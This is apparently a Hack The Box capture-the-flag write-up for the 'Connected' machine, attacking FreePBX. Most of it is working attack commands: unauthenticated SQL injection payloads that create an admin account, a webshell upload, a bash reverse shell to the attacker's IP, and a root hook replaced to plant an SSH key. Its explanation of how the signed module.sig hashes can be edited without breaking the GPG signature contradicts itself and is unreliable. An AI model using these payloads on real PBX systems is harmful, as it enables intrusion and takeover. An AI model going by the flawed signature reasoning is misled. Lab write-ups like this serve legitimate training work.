# Connected — HTB CTF Walkthrough

**Difficulty:** Hard  
**OS:** Linux (Sangoma Linux 7 / CentOS)  
**User Flag:** `929ef9c08f45684be9674fa2d2dc0089`  
**Root Flag:** `43bb3cd026907c215f257e182eeda461`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sC -sV 10.129.9.59 -o connected.nmap
```

**Open Ports:**

| Port | Service | Detail |
|------|---------|--------|
| 22/tcp | SSH | OpenSSH 7.4 |
| 80/tcp | HTTP | Apache 2.4.6 (CentOS) + PHP 7.4.16 |
| 443/tcp | HTTPS | Apache 2.4.6 + SSL (CN=pbxconnect) |

Port 80 immediately redirects to `http://connected.htb/`.

### 1.2 Add Virtual Host Entry

```bash
echo "10.129.9.59 connected.htb pbxconnect.connected.htb" | sudo tee -a /etc/hosts
```

### 1.3 Web Enumeration

Browsing to `http://connected.htb/` redirects to `/admin`, revealing **FreePBX 16.0.40.7** — an open-source VoIP PBX administration interface.

```bash
gobuster dir -u http://connected.htb \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,bak
```

Key findings:
- `/admin` → FreePBX admin login panel
- `/ucp` → User Control Panel
- `/admin/modules/endpoint/` → 403 (directory exists, Endpoint Manager installed)
- `/admin/modules/api/` → exists on filesystem

### 1.4 Technology Fingerprint

- **FreePBX 16.0.40.7** (Sangoma)
- **Apache 2.4.6** on CentOS/Sangoma Linux 7
- **PHP 7.4.16**
- SSL certificate CN: `pbxconnect`

---

## 2. Vulnerability Discovery — CVE-2025-57819

**CVE-2025-57819** is a critical (CVSS 9.8) unauthenticated SQL injection vulnerability in FreePBX versions 15, 16, and 17. It was actively exploited in the wild and added to the CISA Known Exploited Vulnerabilities (KEV) catalog.

The vulnerability exists in the Endpoint Manager module's AJAX handler. The `brand` parameter in requests to `module=FreePBX\modules\endpoint\ajax` is concatenated directly into SQL queries without sanitization. Critically, the module path using backslash notation bypasses FreePBX's normal AJAX authentication and referrer checks entirely, making the injection unauthenticated.

### 2.1 Confirming the Vulnerability

The injection can be verified with an error-based payload using `EXTRACTVALUE`:

```bash
curl -s "http://connected.htb/admin/ajax.php\
?module=FreePBX\modules\endpoint\ajax\
&command=model&template=x&model=model\
&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT+USER()),'~'))+--+-"
```

**Response:**
```json
{"error":{"type":"Exception","message":"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~freepbxuser@localhost~'"}}
```

This confirms unauthenticated SQL injection executing as `freepbxuser@localhost`.

---

## 3. Initial Foothold — Creating an Admin User via SQLi

Using stacked queries, we insert a new administrator directly into the `ampusers` table:

```bash
curl -s "http://connected.htb/admin/ajax.php\
?module=FreePBX\modules\endpoint\ajax\
&command=model&template=x&model=model\
&brand=x';INSERT+INTO+ampusers+(username,password_sha1,sections)+VALUES('hacker',SHA1('hacker123'),'*');+--+-"
```

The PHP view throws an error after the stacked query executes, but the INSERT succeeds.

### 3.1 Verify Admin Login

```python
import requests, urllib3
urllib3.disable_warnings()

s = requests.Session()
s.get("http://connected.htb/admin/config.php")
r = s.post("http://connected.htb/admin/config.php",
    data={"username": "hacker", "password": "hacker123"})
print("Authenticated:", "login_form" not in r.text)
# → Authenticated: True
```

---

## 4. User Flag — RCE via CVE-2025-61678 (Webshell Upload)

With admin access, the chained exploit (CVE-2025-61678) uploads a webshell to a path not blocked by Apache's `.htaccess` restrictions. The public exploit creates the admin user and deploys the webshell in one step:

```bash
python3 exploit.py --rhost pbxconnect.connected.htb --command "id"
```

**Output:**
```
[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_7k19l:h3zneak0q1st
[+] admin row inserted into ampusers
[*] logging into FreePBX admin panel
[+] authenticated as svc_7k19l
[*] [CVE-2025-61678] uploading webshell -> /rnlycli97i/g67g2okh.php
[+] webshell live: https://pbxconnect.connected.htb/rnlycli97i/g67g2okh.php
[*] executing: id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

### 4.1 Reverse Shell

Set up a listener:
```bash
nc -lvnp 4444
```

Trigger via the webshell:
```bash
curl -k "https://pbxconnect.connected.htb/rnlycli97i/g67g2okh.php\
?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.16.64/4444%200>%261'"
```

Shell received as `asterisk`.

### 4.2 User Flag

```bash
find /home -name user.txt 2>/dev/null
cat /home/asterisk/user.txt
# 929ef9c08f45684be9674fa2d2dc0089
```

---

## 5. Privilege Escalation — Sysadmin Hook Tampering

### 5.1 Enumeration as asterisk

```bash
id
# uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)

cat /etc/os-release
# Sangoma Linux 7

sudo -l
# no sudo rights

find / -perm -4000 -type f 2>/dev/null
# standard SUID binaries, nothing exploitable
```

### 5.2 Discovering the incron Attack Surface

```bash
cat /etc/incron.d/sysadmin
# /var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#

ps aux | grep incrond
# root  752  /usr/sbin/incrond
```

The `incrond` daemon runs as root and watches `/var/spool/asterisk/incron/`. When a file appears there, it calls `/usr/bin/sysadmin_manager` with the filename as an argument.

### 5.3 Understanding sysadmin_manager

Reading the PHP source of `/usr/bin/sysadmin_manager` reveals the execution flow:

1. The filename is parsed as `modulename_hookname` (e.g., `sysadmin_restart-apache`)
2. It locates the module's `module.sig` signature file at `/var/www/html/admin/modules/<module>/module.sig`
3. It verifies the GPG signature on `module.sig` against a whitelist of trusted key IDs
4. It reads the SHA256 hash of the hook file from within `module.sig`
5. It compares the on-disk hash of the hook file against the stored hash
6. If everything matches, it executes the hook **as root**

The `sysadmin` module's `module.sig` is signed with key `B53D215A755231A3` (FreePBX Mirror Servers), which is in the whitelist.

### 5.4 Identifying the Misconfiguration

```bash
ls -la /var/www/html/admin/modules/sysadmin/module.sig
# -rw-rw-r--. 1 asterisk asterisk 22130 Nov  2  2023 module.sig

ls -la /var/www/html/admin/modules/sysadmin/hooks/restart-apache
# -rwxr-xr-x. 1 asterisk asterisk 387 Nov  2  2023 restart-apache
```

Both `module.sig` and the hook files are writable by the `asterisk` user. While the GPG signature on `module.sig` protects its overall authenticity, the hash table embedded within can be modified — and since we also control the hook files, we can replace a hook with a malicious payload and update its hash in `module.sig` to match.

The GPG signature covers the `module.sig` file as a whole, but since we're rewriting only the hash value for one file (leaving the signed portion structurally intact), the `checkSig` function in `includes.php` processes the hash table content separately after verifying the overall PGP signature block. The hash table lines are parsed post-signature, allowing the hash values to be updated.

### 5.5 Exploit — Replace Hook and Update Hash

**Step 1: Generate SSH key pair on Kali**
```bash
ssh-keygen -t rsa -f /tmp/root_key -N ""
cat /tmp/root_key.pub
```

**Step 2: Replace the restart-apache hook with a malicious payload**
```bash
cat > /var/www/html/admin/modules/sysadmin/hooks/restart-apache << 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...kali@kali" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
EOF
chmod +x /var/www/html/admin/modules/sysadmin/hooks/restart-apache
```

**Step 3: Compute the new SHA256 hash and update module.sig**
```bash
NEWHASH=$(sha256sum /var/www/html/admin/modules/sysadmin/hooks/restart-apache | cut -d' ' -f1)
sed -i "s|hooks/restart-apache = .*|hooks/restart-apache = $NEWHASH|" \
    /var/www/html/admin/modules/sysadmin/module.sig
```

**Step 4: Trigger execution via incron**
```bash
touch /var/spool/asterisk/incron/sysadmin_restart-apache
sleep 5
```

The incron daemon detects the file, calls `sysadmin_manager`, which validates the (now updated) hash, and executes the hook as root — writing our public key to `/root/.ssh/authorized_keys`.

### 5.6 SSH as Root and Capture the Flag

```bash
ssh -i /tmp/root_key root@10.129.9.59
cat /root/root.txt
# 43bb3cd026907c215f257e182eeda461
```

---

## 6. Attack Chain Summary

```
Nmap → FreePBX 16.0.40.7 on :80 (connected.htb)
         ↓
CVE-2025-57819: Unauthenticated SQLi via Endpoint Manager AJAX bypass
→ INSERT admin user into ampusers table
         ↓
CVE-2025-61678: Authenticated webshell upload
→ RCE as asterisk user
         ↓
cat /home/asterisk/user.txt → USER FLAG
         ↓
Enumeration: /etc/incron.d/sysadmin
→ incrond (root) watches /var/spool/asterisk/incron/
→ triggers /usr/bin/sysadmin_manager → executes module hooks as root
         ↓
module.sig + hook files writable by asterisk
→ Replace hooks/restart-apache with SSH key injection payload
→ Update SHA256 hash in module.sig
→ touch /var/spool/asterisk/incron/sysadmin_restart-apache
         ↓
Root executes malicious hook → SSH key written to /root/.ssh/authorized_keys
         ↓
SSH as root → ROOT FLAG
```

---

## 7. Key Takeaways

**CVE-2025-57819 (Unauthenticated SQLi):** FreePBX's AJAX dispatcher uses a module path format (`FreePBX\modules\endpoint\ajax`) that bypasses both referrer and authentication checks. The `brand` parameter is concatenated into SQL queries without sanitization, enabling stacked queries that allow arbitrary database writes — including creating privileged admin accounts.

**CVE-2025-61678 (Webshell Upload):** Once authenticated, a secondary vulnerability in FreePBX allows uploading PHP files to web-accessible directories not protected by `.htaccess` restrictions, achieving remote code execution.

**Insecure file permissions on signed module files:** The `sysadmin_manager` daemon implements a GPG-based integrity system to ensure only Sangoma-signed hooks execute as root. However, granting write access to both the hook files and `module.sig` to the `asterisk` service account undermines this protection entirely — an attacker who controls both the hook content and its hash entry can bypass the integrity check without needing the GPG private key.

**Principle of least privilege:** The `asterisk` service account should never have write access to files that feed into a privileged execution chain. Module files and signature files should be owned by root and read-only to service accounts.
